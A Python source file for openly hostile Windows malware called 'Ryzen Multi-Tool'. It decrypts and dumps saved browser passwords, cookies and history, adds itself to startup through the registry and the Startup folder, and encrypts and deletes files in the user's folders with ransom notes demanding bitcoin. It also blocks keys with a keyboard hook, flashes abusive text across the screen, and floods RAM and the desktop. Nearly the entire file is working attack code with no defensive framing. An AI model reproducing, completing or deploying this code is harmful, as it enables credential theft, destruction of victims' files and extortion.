import random
import time
import os
import subprocess
import ctypes
from ctypes import wintypes
import sys
import threading
import string
import datetime
import winreg
import json
import base64
import sqlite3
import shutil
import traceback
from pathlib import Path

# Try to import psutil, but don't fail if not available
try:
    import psutil
    PSUTIL_AVAILABLE = True
except Exception:
    psutil = None
    PSUTIL_AVAILABLE = False

# =============================================================================
# CONFIGURATION SECTION
# =============================================================================

STOLEN_DATA_PATH = r"C:\Ryzen-Multitool\StolenData"
ENCRYPTION_KEY = b"RYZEN_WAS_HERE_"
ENCRYPTED_EXTENSION = ".ryzen"
APP_NAME = "Ryzen-Multitool"
VERSION = "3.0-ROBUST"

# Create necessary directories
try:
    os.makedirs(STOLEN_DATA_PATH, exist_ok=True)
except:
    STOLEN_DATA_PATH = os.path.expanduser("~/Documents/RyzenData")
    try:
        os.makedirs(STOLEN_DATA_PATH, exist_ok=True)
    except:
        STOLEN_DATA_PATH = os.path.expanduser("~/Desktop")

# =============================================================================
# WINDOWS API SETUP
# =============================================================================

if os.name == 'nt':
    try:
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        gdi32 = ctypes.windll.gdi32
        
        # Virtual Key Codes
        VK_LWIN = 0x5B
        VK_RWIN = 0x5C
        VK_ESCAPE = 0x1B
        VK_CONTROL = 0x11
        VK_MENU = 0x12
        VK_TAB = 0x09
        VK_F12 = 0x7B
        WH_KEYBOARD_LL = 13
        
        # Structures
        class KBDLLHOOKSTRUCT(ctypes.Structure):
            _fields_ = [
                ("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", wintypes.ULONG)
            ]
        
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ('cbData', wintypes.DWORD),
                ('pbData', wintypes.LPBYTE)
            ]
        
        class RECT(ctypes.Structure):
            _fields_ = [
                ("left", ctypes.c_long),
                ("top", ctypes.c_long),
                ("right", ctypes.c_long),
                ("bottom", ctypes.c_long)
            ]
        
        # Function prototypes
        GetDC = user32.GetDC
        GetDC.argtypes = [wintypes.HWND]
        GetDC.restype = wintypes.HDC
        
        ReleaseDC = user32.ReleaseDC
        ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
        ReleaseDC.restype = ctypes.c_int
        
        GetDesktopWindow = user32.GetDesktopWindow
        
        PatBlt = gdi32.PatBlt
        PatBlt.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int, wintypes.DWORD]
        
        CreateSolidBrush = gdi32.CreateSolidBrush
        DeleteObject = gdi32.DeleteObject
        
        FillRect = user32.FillRect
        FillRect.argtypes = [wintypes.HDC, ctypes.POINTER(RECT), wintypes.HBRUSH]
        
        SetTextColor = gdi32.SetTextColor
        SetTextColor.argtypes = [wintypes.HDC, wintypes.COLORREF]
        
        SetBkMode = gdi32.SetBkMode
        SetBkMode.argtypes = [wintypes.HDC, ctypes.c_int]
        
        TextOutW = gdi32.TextOutW
        TextOutW.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int, wintypes.LPCWSTR, ctypes.c_int]
        
        CreateFontW = gdi32.CreateFontW
        CreateFontW.argtypes = [
            ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int,
            wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
            wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.LPCWSTR
        ]
        
        SelectObject = gdi32.SelectObject
        SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
        SelectObject.restype = wintypes.HGDIOBJ
        
        # Constants
        PATINVERT = 0x005A0049
        TRANSPARENT = 1
        OPAQUE = 2
        STD_OUTPUT_HANDLE = -11
        INVALID_HANDLE_VALUE = -1
        
        WINDOWS_API_AVAILABLE = True
        
    except Exception as e:
        print(f"[!] Windows API initialization error: {e}")
        WINDOWS_API_AVAILABLE = False
else:
    WINDOWS_API_AVAILABLE = False

# =============================================================================
# GLOBAL VARIABLES
# =============================================================================

_hHook = None
_block_keys = True
_hook_active = False
_hook_callback = None
_flicker_active = False
_ram_eater_active = False
_encryption_active = False
_memory_list = []
_print_lock = threading.Lock()
_encrypted_count = 0
_file_counter = 0
_error_count = 0

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

def _log(msg):
    """Thread-safe logging with timestamp."""
    try:
        with _print_lock:
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {msg}")
            sys.stdout.flush()
    except:
        pass

def safe_execute(func, *args, default_return=None, error_msg="Error"):
    """Safely execute a function with error handling."""
    global _error_count
    try:
        return func(*args)
    except Exception as e:
        _error_count += 1
        _log(f"[!] {error_msg}: {str(e)[:100]}")
        return default_return

def boot_animation():
    """Display boot animation with error handling."""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass
    
    logo_lines = [
        "╔═══════════════════════════════════════════════════════════╗",
        "║                                                           ║",
        "║   ██████╗ ██╗   ██╗███████╗███████╗███╗   ██╗             ║",
        "║   ██╔══██╗╚██╗ ██╔╝╚══███╔╝██╔════╝████╗  ██║             ║",
        "║   ██████╔╝ ╚████╔╝   ███╔╝ █████╗  ██╔██╗ ██║             ║",
        "║   ██╔══██╗  ╚██╔╝   ███╔╝  ██╔══╝  ██║╚██╗██║             ║",
        "║   ██║  ██║   ██║   ███████╗███████╗██║ ╚████║             ║",
        "║   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝             ║",
        "║                                                           ║",
        f"║              M U L T I - T O O L  v{VERSION}                    ║",
        "║                                                           ║",
        "╚═══════════════════════════════════════════════════════════╝"
    ]
    
    for line in logo_lines:
        try:
            print(line)
            time.sleep(0.02)
        except:
            pass
    
    # Loading bar
    try:
        print("\n[*] Initializing system...")
        for i in range(0, 101, 5):
            bar = "█" * (i // 5) + "░" * (20 - (i // 5))
            print(f"\r[*] Loading: [{bar}] {i}%", end="")
            time.sleep(0.03)
        print("\n")
    except:
        pass
    
    status_messages = [
        "[✓] System ready",
        "[✓] Modules loaded",
        "[✓] API initialized",
        "[✓] Starting attack..."
    ]
    
    for msg in status_messages:
        try:
            print(msg)
            time.sleep(0.1)
        except:
            pass
    
    time.sleep(0.3)

# =============================================================================
# BROWSER DATA EXTRACTION
# =============================================================================

def decrypt_password(encrypted_data):
    """Decrypt password using Windows DPAPI."""
    if not encrypted_data:
        return ""
    
    try:
        # Remove v10/v11 prefix if present
        if encrypted_data.startswith(b'v10') or encrypted_data.startswith(b'v11'):
            encrypted_data = encrypted_data[3:]
        
        blob_in = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, wintypes.LPBYTE))
        blob_out = DATA_BLOB()
        
        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        ):
            cbData = int(blob_out.cbData)
            pbData = blob_out.pbData
            buffer = ctypes.create_string_buffer(cbData)
            ctypes.memmove(buffer, pbData, cbData)
            ctypes.windll.kernel32.LocalFree(pbData)
            
            try:
                return buffer.raw.decode('utf-8')
            except:
                return buffer.raw.decode('latin-1', errors='ignore')
        
        return "[DECRYPTION FAILED]"
        
    except Exception as e:
        return f"[ERROR: {str(e)[:50]}]"

def steal_browser_data():
    """Extract and decrypt browser data."""
    _log("[*] Starting browser data extraction...")
    
    try:
        os.makedirs(STOLEN_DATA_PATH, exist_ok=True)
    except Exception as e:
        _log(f"[!] Cannot create directory: {e}")
        return None
    
    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    output_file = os.path.join(STOLEN_DATA_PATH, f"browser_data_{timestamp}.txt")
    
    try:
        with open(output_file, 'w', encoding='utf-8') as out:
            out.write("=" * 70 + "\n")
            out.write("BROWSER DATA EXTRACTION - DECRYPTED\n")
            out.write(f"Timestamp: {datetime.datetime.now()}\n")
            out.write(f"User: {getpass.getuser()}\n")
            out.write(f"Computer: {os.environ.get('COMPUTERNAME', 'Unknown')}\n")
            out.write("=" * 70 + "\n\n")
            
            browsers = [
                ("Chrome", "Google\\Chrome"),
                ("Edge", "Microsoft\\Edge")
            ]
            
            for browser_name, browser_path in browsers:
                try:
                    _log(f"[*] Scanning {browser_name}...")
                    
                    # Login Data
                    login_db_path = os.path.expanduser(
                        f"~\\AppData\\Local\\{browser_path}\\User Data\\Default\\Login Data"
                    )
                    
                    if os.path.exists(login_db_path):
                        try:
                            temp_db = os.path.join(STOLEN_DATA_PATH, f"{browser_name.lower()}_temp.db")
                            shutil.copy2(login_db_path, temp_db)
                            
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute(
                                "SELECT origin_url, username_value, password_value FROM logins"
                            )
                            
                            out.write(f"\n{'='*70}\n")
                            out.write(f"{browser_name.upper()} PASSWORDS (DECRYPTED)\n")
                            out.write(f"{'='*70}\n")
                            
                            count = 0
                            for row in cursor.fetchall():
                                try:
                                    url, username, encrypted_password = row
                                    if username and encrypted_password:
                                        decrypted_pass = decrypt_password(encrypted_password)
                                        out.write(f"\nWebsite: {url}\n")
                                        out.write(f"Username: {username}\n")
                                        out.write(f"Password: {decrypted_pass}\n")
                                        out.write("-" * 40 + "\n")
                                        count += 1
                                except:
                                    continue
                            
                            conn.close()
                            try:
                                os.remove(temp_db)
                            except:
                                pass
                            
                            _log(f"[+] {browser_name}: {count} passwords decrypted")
                            
                        except Exception as e:
                            _log(f"[!] {browser_name} login error: {str(e)[:50]}")
                    
                    # Cookies
                    cookie_paths = [
                        os.path.expanduser(f"~\\AppData\\Local\\{browser_path}\\User Data\\Default\\Network\\Cookies"),
                        os.path.expanduser(f"~\\AppData\\Local\\{browser_path}\\User Data\\Default\\Cookies")
                    ]
                    
                    cookie_db = None
                    for cp in cookie_paths:
                        if os.path.exists(cp):
                            cookie_db = cp
                            break
                    
                    if cookie_db:
                        try:
                            temp_cookie = os.path.join(STOLEN_DATA_PATH, f"{browser_name.lower()}_cookies_temp.db")
                            shutil.copy2(cookie_db, temp_cookie)
                            
                            conn = sqlite3.connect(temp_cookie)
                            cursor = conn.cursor()
                            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
                            
                            out.write(f"\n{'='*70}\n")
                            out.write(f"{browser_name.upper()} COOKIES (First 50)\n")
                            out.write(f"{'='*70}\n")
                            
                            for i, row in enumerate(cursor.fetchall()):
                                if i >= 50:
                                    break
                                try:
                                    host, name, value, encrypted = row
                                    if encrypted and len(encrypted) > 0:
                                        try:
                                            decrypted_value = decrypt_password(encrypted)
                                        except:
                                            decrypted_value = value
                                    else:
                                        decrypted_value = value
                                    
                                    out.write(f"\nHost: {host}\n")
                                    out.write(f"Name: {name}\n")
                                    out.write(f"Value: {str(decrypted_value)[:200]}\n")
                                    out.write("-" * 40 + "\n")
                                except:
                                    continue
                            
                            conn.close()
                            try:
                                os.remove(temp_cookie)
                            except:
                                pass
                            
                            _log(f"[+] {browser_name} cookies extracted")
                            
                        except Exception as e:
                            _log(f"[!] {browser_name} cookies error: {str(e)[:50]}")
                    
                    # History
                    history_db = os.path.expanduser(
                        f"~\\AppData\\Local\\{browser_path}\\User Data\\Default\\History"
                    )
                    
                    if os.path.exists(history_db):
                        try:
                            temp_hist = os.path.join(STOLEN_DATA_PATH, f"{browser_name.lower()}_hist_temp.db")
                            shutil.copy2(history_db, temp_hist)
                            
                            conn = sqlite3.connect(temp_hist)
                            cursor = conn.cursor()
                            cursor.execute(
                                "SELECT url, title, visit_count, last_visit_time FROM urls "
                                "ORDER BY last_visit_time DESC LIMIT 100"
                            )
                            
                            out.write(f"\n{'='*70}\n")
                            out.write(f"{browser_name.upper()} HISTORY (Last 100)\n")
                            out.write(f"{'='*70}\n")
                            
                            for row in cursor.fetchall():
                                try:
                                    url, title, count, last_visit = row
                                    out.write(f"\nTitle: {title}\n")
                                    out.write(f"URL: {url}\n")
                                    out.write(f"Visits: {count}\n")
                                    out.write("-" * 40 + "\n")
                                except:
                                    continue
                            
                            conn.close()
                            try:
                                os.remove(temp_hist)
                            except:
                                pass
                            
                            _log(f"[+] {browser_name} history extracted")
                            
                        except Exception as e:
                            _log(f"[!] {browser_name} history error: {str(e)[:50]}")
                            
                except Exception as e:
                    _log(f"[!] {browser_name} general error: {str(e)[:50]}")
            
            # Firefox
            try:
                _log("[*] Scanning Firefox...")
                firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
                
                if os.path.exists(firefox_path):
                    for profile in os.listdir(firefox_path):
                        profile_path = os.path.join(firefox_path, profile)
                        if not os.path.isdir(profile_path):
                            continue
                        
                        # Firefox Cookies
                        cookie_file = os.path.join(profile_path, "cookies.sqlite")
                        if os.path.exists(cookie_file):
                            try:
                                temp_ff = os.path.join(STOLEN_DATA_PATH, "firefox_cookies_temp.db")
                                shutil.copy2(cookie_file, temp_ff)
                                
                                conn = sqlite3.connect(temp_ff)
                                cursor = conn.cursor()
                                cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 50")
                                
                                out.write(f"\n{'='*70}\n")
                                out.write(f"FIREFOX COOKIES\n")
                                out.write(f"{'='*70}\n")
                                
                                for row in cursor.fetchall():
                                    try:
                                        host, name, value = row
                                        out.write(f"\nHost: {host}\n")
                                        out.write(f"Name: {name}\n")
                                        out.write(f"Value: {str(value)[:200]}\n")
                                        out.write("-" * 40 + "\n")
                                    except:
                                        continue
                                
                                conn.close()
                                try:
                                    os.remove(temp_ff)
                                except:
                                    pass
                                
                                _log("[+] Firefox cookies extracted")
                                
                            except Exception as e:
                                _log(f"[!] Firefox cookies error: {str(e)[:50]}")
                        
                        # Firefox History
                        places_file = os.path.join(profile_path, "places.sqlite")
                        if os.path.exists(places_file):
                            try:
                                temp_ff = os.path.join(STOLEN_DATA_PATH, "firefox_places_temp.db")
                                shutil.copy2(places_file, temp_ff)
                                
                                conn = sqlite3.connect(temp_ff)
                                cursor = conn.cursor()
                                cursor.execute(
                                    "SELECT url, title, visit_count FROM moz_places "
                                    "ORDER BY last_visit_date DESC LIMIT 100"
                                )
                                
                                out.write(f"\n{'='*70}\n")
                                out.write(f"FIREFOX HISTORY\n")
                                out.write(f"{'='*70}\n")
                                
                                for row in cursor.fetchall():
                                    try:
                                        url, title, count = row
                                        out.write(f"\nTitle: {title}\n")
                                        out.write(f"URL: {url}\n")
                                        out.write(f"Visits: {count}\n")
                                        out.write("-" * 40 + "\n")
                                    except:
                                        continue
                                
                                conn.close()
                                try:
                                    os.remove(temp_ff)
                                except:
                                    pass
                                
                                _log("[+] Firefox history extracted")
                                
                            except Exception as e:
                                _log(f"[!] Firefox history error: {str(e)[:50]}")
                                
            except Exception as e:
                _log(f"[!] Firefox error: {str(e)[:50]}")
            
            # Footer
            out.write("\n" + "=" * 70 + "\n")
            out.write("END OF EXTRACTION\n")
            out.write("=" * 70 + "\n")
            out.write(f"\nData saved to: {output_file}\n")
        
        _log(f"[+] Browser data saved: {output_file}")
        return output_file
        
    except Exception as e:
        _log(f"[!] Fatal error in browser extraction: {str(e)[:100]}")
        return None

# =============================================================================
# AUTOSTART (NO ADMIN REQUIRED)
# =============================================================================

def add_to_startup_no_admin():
    """Add to startup using multiple methods (no admin required)."""
    exe_path = os.path.abspath(sys.argv[0])
    success = False
    
    # Method 1: Registry (HKEY_CURRENT_USER - no admin needed)
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        _log("[+] Registry startup: SUCCESS")
        success = True
    except Exception as e:
        _log(f"[!] Registry failed: {str(e)[:50]}")
    
    # Method 2: Startup folder
    try:
        startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        if os.path.exists(startup_folder):
            shortcut_path = os.path.join(startup_folder, f"{APP_NAME}.lnk")
            
            # Create shortcut using WScript.Shell
            vbs_script = f'''
            Set WshShell = WScript.CreateObject("WScript.Shell")
            Set oLink = WshShell.CreateShortcut("{shortcut_path}")
            oLink.TargetPath = "{exe_path}"
            oLink.WorkingDirectory = "{os.path.dirname(exe_path)}"
            oLink.Save
            '''
            
            temp_vbs = os.path.join(os.environ['TEMP'], 'createshortcut.vbs')
            with open(temp_vbs, 'w') as f:
                f.write(vbs_script)
            
            subprocess.run(['cscript', '//nologo', temp_vbs], check=True, capture_output=True)
            
            try:
                os.remove(temp_vbs)
            except:
                pass
            
            _log("[+] Startup folder: SUCCESS")
            success = True
    except Exception as e:
        _log(f"[!] Startup folder failed: {str(e)[:50]}")
    
    # Method 3: RunOnce key
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        _log("[+] RunOnce key: SUCCESS")
        success = True
    except Exception as e:
        _log(f"[!] RunOnce failed: {str(e)[:50]}")
    
    if success:
        _log("[+] Autostart enabled (NO ADMIN REQUIRED)")
    else:
        _log("[!] All autostart methods failed")
    
    return success

# =============================================================================
# RANSOMWARE ENCRYPTION
# =============================================================================

def xor_encrypt(data, key):
    """XOR encryption."""
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def encrypt_file(filepath):
    """Encrypt a single file."""
    global _encrypted_count
    
    try:
        ext = os.path.splitext(filepath)[1].lower()
        
        # Skip certain file types
        skip_extensions = ['.exe', '.dll', '.sys', '.ryzen', '.py', '.tmp', '.bat', '.cmd']
        if ext in skip_extensions:
            return False
        
        # Skip if already encrypted
        if filepath.endswith(ENCRYPTED_EXTENSION):
            return False
        
        # Read file
        with open(filepath, 'rb') as f:
            data = f.read()
        
        if not data or len(data) < 1:
            return False
        
        # Encrypt
        encrypted = xor_encrypt(data, ENCRYPTION_KEY)
        new_path = filepath + ENCRYPTED_EXTENSION
        
        # Write encrypted file
        with open(new_path, 'wb') as f:
            f.write(encrypted)
        
        # Delete original
        os.remove(filepath)
        
        with _print_lock:
            _encrypted_count += 1
        
        return True
        
    except Exception as e:
        return False

def ransomware_thread():
    """Ransomware encryption thread."""
    global _encryption_active
    
    _log("[*] RANSOMWARE: Starting file encryption...")
    
    targets = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Videos"),
        os.path.expanduser("~/Music"),
    ]
    
    for target in targets:
        if not _encryption_active:
            break
        
        if not os.path.exists(target):
            continue
        
        _log(f"[*] Encrypting: {target}")
        
        try:
            for root, dirs, files in os.walk(target):
                if not _encryption_active:
                    break
                
                for file in files:
                    if not _encryption_active:
                        break
                    
                    try:
                        filepath = os.path.join(root, file)
                        if encrypt_file(filepath):
                            if _encrypted_count % 100 == 0 and _encrypted_count > 0:
                                _log(f"[+] Encrypted: {_encrypted_count} files")
                    except:
                        continue
                        
        except Exception as e:
            _log(f"[!] Error encrypting {target}: {str(e)[:50]}")
    
    _log(f"[+] Encryption complete: {_encrypted_count} files")

def create_ransom_note():
    """Create ransom notes on desktop."""
    note = """YOUR FILES HAVE BEEN ENCRYPTED BY RYZEN!

All your important files have been encrypted with military-grade encryption.
To decrypt them, you need the decryption key.

Payment required: 0.5 BTC
Wallet: 1RyzenHack3rXXXXXXX

You have 48 hours before the key is deleted permanently.

WARNING: Do not try to decrypt files yourself.

GOT FUCKED BY RYZEN!"""
    
    desktop = os.path.expanduser("~/Desktop")
    
    try:
        # Create main note
        note_path = os.path.join(desktop, "README_RESTORE_FILES.txt")
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(note)
        
        # Create multiple copies
        for i in range(20):
            try:
                copy_path = os.path.join(desktop, f"README_RESTORE_FILES_{i}.txt")
                shutil.copy2(note_path, copy_path)
            except:
                pass
        
        _log("[+] Ransom notes created")
        
    except Exception as e:
        _log(f"[!] Ransom note error: {str(e)[:50]}")

# =============================================================================
# SCREEN FLASHER WITH STATIC TEXT
# =============================================================================

def screen_flasher():
    """Screen flasher with static text in middle."""
    global _flicker_active
    
    if not WINDOWS_API_AVAILABLE:
        _log("[!] Windows API not available, screen flasher disabled")
        return
    
    _flicker_active = True
    
    colors = [
        0x000000FF,  # Red
        0x0000FF00,  # Green
        0x00FF0000,  # Blue
        0x00FFFF00,  # Yellow
        0x00FF00FF,  # Magenta
        0x0000FFFF,  # Cyan
        0x00000000,  # Black
        0x00FFFFFF   # White
    ]
    
    try:
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
    except:
        screen_width = 1920
        screen_height = 1080
    
    # Create font
    font = None
    try:
        font = CreateFontW(72, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 0, 0, "Arial")
    except:
        pass
    
    # Static text
    static_text = "RYZEN FUCKED YOU! GGS TO YOUR PC, HAHAHA!"
    
    while _flicker_active:
        try:
            hwnd = GetDesktopWindow()
            hdc = GetDC(hwnd)
            
            if not hdc:
                time.sleep(0.1)
                continue
            
            # Draw background color
            color = random.choice(colors)
            brush = CreateSolidBrush(color)
            rect = RECT(0, 0, screen_width, screen_height)
            FillRect(hdc, ctypes.byref(rect), brush)
            DeleteObject(brush)
            
            # Set text properties (WHITE - doesn't change!)
            try:
                SetTextColor(hdc, 0x00FFFFFF)  # White
                SetBkMode(hdc, TRANSPARENT)
                
                if font:
                    old_font = SelectObject(hdc, font)
                
                # Calculate position (center)
                text_x = screen_width // 2 - 500
                text_y = screen_height // 2
                
                # Draw text
                TextOutW(hdc, text_x, text_y, static_text, len(static_text))
                
                if font:
                    SelectObject(hdc, old_font)
                
            except Exception as e:
                pass
            
            # Invert for effect
            try:
                PatBlt(hdc, 0, 0, screen_width, screen_height, PATINVERT)
            except:
                pass
            
            # Release DC
            try:
                ReleaseDC(hwnd, hdc)
            except:
                pass
            
            time.sleep(0.5)  # Flash every 0.5 seconds
            
        except Exception as e:
            time.sleep(0.1)
    
    # Cleanup
    if font:
        try:
            DeleteObject(font)
        except:
            pass

# =============================================================================
# KEYBOARD BLOCKER
# =============================================================================

def _keyboard_proc(nCode, wParam, lParam):
    """Keyboard hook procedure."""
    global _block_keys
    
    if nCode == 0:
        try:
            kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            vkCode = kb.vkCode
            
            if _block_keys:
                # Block Windows keys
                if vkCode in (VK_LWIN, VK_RWIN):
                    return 1
                # Block Ctrl+Esc
                if vkCode == VK_ESCAPE:
                    if user32.GetAsyncKeyState(VK_CONTROL) & 0x8000:
                        return 1
                # Block Alt+Tab
                if vkCode == VK_TAB:
                    if user32.GetAsyncKeyState(VK_MENU) & 0x8000:
                        return 1
        except:
            pass
    
    try:
        return user32.CallNextHookEx(None, nCode, wParam, lParam)
    except:
        return 0

def keyboard_blocker():
    """Install keyboard hook."""
    global _hHook, _hook_active, _hook_callback
    
    if not WINDOWS_API_AVAILABLE:
        _log("[!] Windows API not available, keyboard blocker disabled")
        return
    
    try:
        HOOKPROC = ctypes.WINFUNCTYPE(
            wintypes.LPARAM, ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM
        )
        _hook_callback = HOOKPROC(_keyboard_proc)
        
        _hHook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _hook_callback, None, 0)
        
        if not _hHook:
            _log("[!] Failed to install keyboard hook")
            return
        
        _hook_active = True
        _log("[+] Keyboard hook installed")
        
        # Message loop
        msg = wintypes.MSG()
        while _hook_active:
            try:
                ret = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                if ret == 0 or ret == -1:
                    break
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
            except:
                break
                
    except Exception as e:
        _log(f"[!] Keyboard hook error: {str(e)[:50]}")

# =============================================================================
# ULTRA RAM EATER
# =============================================================================

def ultra_ram_eater():
    """Ultra efficient RAM eater."""
    global _ram_eater_active
    
    _log("[*] ULTRA RAM Eater starting...")
    
    def allocate_bytearray():
        """Allocate large bytearray chunks."""
        chunk_size = 100 * 1024 * 1024  # 100MB
        
        while _ram_eater_active:
            try:
                big_chunk = bytearray(chunk_size)
                
                # Fill with random data to prevent optimization
                for i in range(0, chunk_size, 4096):
                    try:
                        big_chunk[i] = random.randint(0, 255)
                    except:
                        break
                
                _memory_list.append(big_chunk)
                
                total_mb = len(_memory_list) * 100
                if len(_memory_list) % 10 == 0:
                    _log(f"[RAM] +100MB (Total: {total_mb}MB)")
                
                time.sleep(0.01)
                
            except MemoryError:
                _log("[!] Memory full!")
                time.sleep(1)
            except Exception as e:
                time.sleep(0.1)
    
    def allocate_large_blocks():
        """Allocate large list blocks."""
        while _ram_eater_active:
            try:
                block = [0] * (10 * 1024 * 1024)  # 10MB list
                _memory_list.append(block)
                time.sleep(0.05)
            except:
                time.sleep(0.1)
    
    def desktop_flood():
        """Flood desktop with files and load into RAM."""
        global _file_counter
        
        desktop = os.path.expanduser("~/Desktop")
        
        while _ram_eater_active:
            try:
                for _ in range(20):
                    with _print_lock:
                        _file_counter += 1
                        fileno = _file_counter
                    
                    filename = f"RYZEN_{fileno:06d}_{''.join(random.choices(string.ascii_uppercase, k=10))}.txt"
                    filepath = os.path.join(desktop, filename)
                    
                    # Write 10MB file
                    with open(filepath, 'wb') as f:
                        f.write(os.urandom(10 * 1024 * 1024))
                    
                    # Read into memory
                    with open(filepath, 'rb') as f:
                        _memory_list.append(f.read())
                
                if fileno % 100 == 0:
                    _log(f"[DESKTOP] {fileno} files created")
                    
            except Exception as e:
                time.sleep(0.1)
    
    # Start multiple threads
    threads = []
    
    for i in range(3):
        t = threading.Thread(target=allocate_bytearray, daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.1)
    
    t = threading.Thread(target=allocate_large_blocks, daemon=True)
    t.start()
    threads.append(t)
    
    t = threading.Thread(target=desktop_flood, daemon=True)
    t.start()
    threads.append(t)

# =============================================================================
# MAIN FUNCTION
# =============================================================================

def main():
    """Main entry point."""
    
    # Boot animation
    try:
        boot_animation()
    except Exception as e:
        _log(f"[!] Boot animation error: {str(e)[:50]}")
    
    # Add to startup (no admin)
    try:
        add_to_startup_no_admin()
    except Exception as e:
        _log(f"[!] Autostart error: {str(e)[:50]}")
    
    _log("=" * 70)
    _log(f"*** RYZEN MULTI-TOOL v{VERSION} ***")
    _log("*** ROBUST MODE - NO ADMIN REQUIRED ***")
    _log("=" * 70)
    
    # Steal browser data
    try:
        result = steal_browser_data()
        if result:
            _log(f"[+] Browser data stolen: {result}")
    except Exception as e:
        _log(f"[!] Browser steal error: {str(e)[:100]}")
    
    # Start keyboard blocker
    try:
        kb_thread = threading.Thread(target=keyboard_blocker, daemon=True)
        kb_thread.start()
        _log("[+] Keyboard blocker started")
    except Exception as e:
        _log(f"[!] Keyboard blocker error: {str(e)[:50]}")
    
    # Start screen flasher
    try:
        screen_thread = threading.Thread(target=screen_flasher, daemon=True)
        screen_thread.start()
        _log("[+] Screen flasher started (with static text)")
    except Exception as e:
        _log(f"[!] Screen flasher error: {str(e)[:50]}")
    
    # Start ransomware
    global _encryption_active
    _encryption_active = True
    
    for i in range(3):
        try:
            t = threading.Thread(target=ransomware_thread, daemon=True)
            t.start()
            time.sleep(0.3)
        except Exception as e:
            _log(f"[!] Ransomware thread error: {str(e)[:50]}")
    
    _log("[+] Ransomware encryption started")
    
    # Create ransom notes
    try:
        create_ransom_note()
    except Exception as e:
        _log(f"[!] Ransom note error: {str(e)[:50]}")
    
    # Start RAM eater
    global _ram_eater_active
    _ram_eater_active = True
    
    try:
        ultra_ram_eater()
        _log("[+] ULTRA RAM eater started")
    except Exception as e:
        _log(f"[!] RAM eater error: {str(e)[:50]}")
    
    _log("=" * 70)
    _log("*** SYSTEM FUCKED BY RYZEN ***")
    _log("*** ALL YOUR BASE ARE BELONG TO US ***")
    _log("=" * 70)
    
    # Status monitor loop
    loop_count = 0
    while True:
        try:
            time.sleep(5)
            loop_count += 1
            
            # Calculate RAM usage
            try:
                total_bytes = 0
                for item in _memory_list:
                    if isinstance(item, (bytes, bytearray)):
                        total_bytes += len(item)
                    elif isinstance(item, list):
                        total_bytes += len(item) * 8
                
                total_mb = total_bytes / 1024 / 1024
                _log(f"Status: Loop {loop_count} | Files: {_encrypted_count} | RAM: ~{total_mb:.0f}MB | Errors: {_error_count}")
            except:
                _log(f"Status: Loop {loop_count} | Files: {_encrypted_count} | Errors: {_error_count}")
                
        except KeyboardInterrupt:
            _log("\n[!] Interrupted by user")
            break
        except Exception as e:
            _log(f"[!] Status loop error: {str(e)[:50]}")
            time.sleep(5)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(0)
    except Exception as exc:
        print(f'[!] FATAL ERROR: {exc}')
        traceback.print_exc()
        sys.exit(1)